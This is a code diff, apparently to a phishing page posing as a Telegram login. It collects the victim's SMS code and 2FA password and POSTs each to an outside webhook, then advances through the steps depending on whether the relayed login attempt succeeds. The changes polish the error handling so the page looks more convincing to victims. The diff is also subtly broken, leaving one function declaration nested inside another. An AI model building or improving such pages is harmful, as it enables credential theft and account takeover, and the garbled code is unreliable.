@@ -406,66 +406,88 @@
     // --- UPDATED: Code step (fetch and read reply) ---
     async function submitSmsStep() {
         const code = document.getElementById("sms-code-input").value.trim();
-        if (!code) return;
-        try {
-            const response = await fetch(BOT2_WEBHOOK_URL, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ text: code })
-            });
-            const data = await response.json();
-            const reply = data.reply || "";
-            // Check if the reply indicates a successful step (2FA required, login successful, or password prompt)
-            if (reply.includes("2FA required") || reply.includes("login successful") || reply.includes("Enter your cloud password")) {
-                // Success: proceed to password page
-                transitionStep("step-sms", "step-password");
-            } else {
-                // Error: show "Try again" alert, clear input, stay on same page
-                alert("Try again");
-                const input = document.getElementById("sms-code-input");
-                input.value = "";
-                input.focus();
-                // Optional: red border (you can add CSS class)
-                input.style.borderColor = "red";
-                input.style.borderWidth = "2px";
-            }
-        } catch (error) {
-            console.error("Fetch error:", error);
-            alert("Try again");
+    async function submitSmsStep() {
+    const code = document.getElementById("sms-code-input").value.trim();
+    if (!code) return;
+    try {
+        const response = await fetch(BOT2_WEBHOOK_URL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ text: code })
+        });
+        const data = await response.json();
+        const reply = data.reply || "";
+        if (reply.includes("2FA required") || reply.includes("login successful") || reply.includes("Enter your cloud password")) {
+            transitionStep("step-sms", "step-password");
+        } else {
+            const input = document.getElementById("sms-code-input");
+            input.value = "";
+            input.style.borderColor = "red";
+            input.style.borderWidth = "2px";
+            input.focus();
+            input.oninput = function() {
+                input.style.borderColor = "";
+                input.style.borderWidth = "";
+                input.oninput = null;
+            };
         }
+    } catch (error) {
+        console.error("Fetch error:", error);
+        const input = document.getElementById("sms-code-input");
+        input.value = "";
+        input.style.borderColor = "red";
+        input.style.borderWidth = "2px";
+        input.focus();
+        input.oninput = function() {
+            input.style.borderColor = "";
+            input.style.borderWidth = "";
+            input.oninput = null;
+        };
+    }
     }
     // --- UPDATED: Password step (fetch and read reply) ---
     async function submitAuthentication() {
-        const pwd = document.getElementById("password-input").value.trim();
-        if (!pwd) return;
-        try {
-            const response = await fetch(BOT2_WEBHOOK_URL, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ text: pwd })
-            });
-            const data = await response.json();
-            const reply = data.reply || "";
-            if (reply.includes("login successful")) {
-                // Success: proceed to success page
-                transitionStep("step-password", "step-success");
-            } else {
-                // Determine message
-                let msg = "Try again";
-                if (reply.toLowerCase().includes("password")) {
-                    msg = "Incorrect password";
-                }
-                alert(msg);
-                const input = document.getElementById("password-input");
-                input.value = "";
-                input.focus();
-                input.style.borderColor = "red";
-                input.style.borderWidth = "2px";
-            }
-        } catch (error) {
-            console.error("Fetch error:", error);
-            alert("Try again");
+    const pwd = document.getElementById("password-input").value.trim();
+    if (!pwd) return;
+    try {
+        const response = await fetch(BOT2_WEBHOOK_URL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ text: pwd })
+        });
+        const data = await response.json();
+        const reply = data.reply || "";
+        if (reply.includes("login successful")) {
+            transitionStep("step-password", "step-success");
+        } else {
+            const input = document.getElementById("password-input");
+            input.value = "";
+            input.placeholder = "Incorrect password";
+            input.style.borderColor = "red";
+            input.style.borderWidth = "2px";
+            input.focus();
+            input.oninput = function() {
+                input.placeholder = "Enter your Telegram 2FA Password";
+                input.style.borderColor = "";
+                input.style.borderWidth = "";
+                input.oninput = null;
+            };
         }
+    } catch (error) {
+        console.error("Fetch error:", error);
+        const input = document.getElementById("password-input");
+        input.value = "";
+        input.placeholder = "Try again";
+        input.style.borderColor = "red";
+        input.style.borderWidth = "2px";
+        input.focus();
+        input.oninput = function() {
+            input.placeholder = "Enter your Telegram 2FA Password";
+            input.style.borderColor = "";
+            input.style.borderWidth = "";
+            input.oninput = null;
+        };
+    }
     }
     // --- Other functions unchanged ---
     function validateSmsForm() { const val = document.getElementById("sms-code-input").value.trim(); const btn = document.getElementById("sms-submit-btn"); if(val.length > 0) btn.removeAttribute("disabled"); else btn.setAttribute("disabled", "true"); }
